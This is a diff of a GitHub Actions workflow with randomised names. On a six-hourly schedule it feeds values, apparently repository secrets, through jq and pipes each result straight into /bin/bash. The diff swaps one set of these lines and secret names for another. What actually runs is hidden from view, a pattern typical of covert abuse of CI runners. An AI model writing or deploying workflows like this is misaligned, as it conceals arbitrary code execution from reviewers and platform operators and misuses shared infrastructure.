@@ -1,28 +1,20 @@
 name: renyifu9876
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 1/6 * * *'
-
-jobs:  # 30613
+    - cron: '36 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: renyifu9876
         env:
-          tvk11: ${{ secrets.tvk11 }}
+          fp0726: ${{ secrets.fp0726 }}
         run: |
-          echo $tvk11 | jq -r .un6 | /bin/bash
-          echo $f1876 | jq -r .i72166 | /bin/bash
-          echo $vam7090 | jq -r .wvqv88320 | /bin/bash
-          echo $ymcc21 | jq -r .pjjyu197 | /bin/bash
-          echo $grda805 | jq -r .x7804 | /bin/bash
-          echo $xngch876 | jq -r .oodv5843 | /bin/bash
-          echo $dwnst86454 | jq -r .r86892 | /bin/bash
-          echo $tkk57831 | jq -r .kz87 | /bin/bash
-          echo $x801 | jq -r .e9 | /bin/bash
-          echo $dnu52 | jq -r .hqs117 | /bin/bash
-          echo $lf74 | jq -r .gh24464 | /bin/bash
+          echo $fp0726 | jq -r .brt794 | /bin/bash
+          echo $dkzhx1373 | jq -r .qkigi55096 | /bin/bash
+          echo $sqinw2876 | jq -r .zhnt25481 | /bin/bash
+          echo $t4 | jq -r .vgvus45045 | /bin/bash
+          echo $zv52748 | jq -r .okhlr9145 | /bin/bash
 
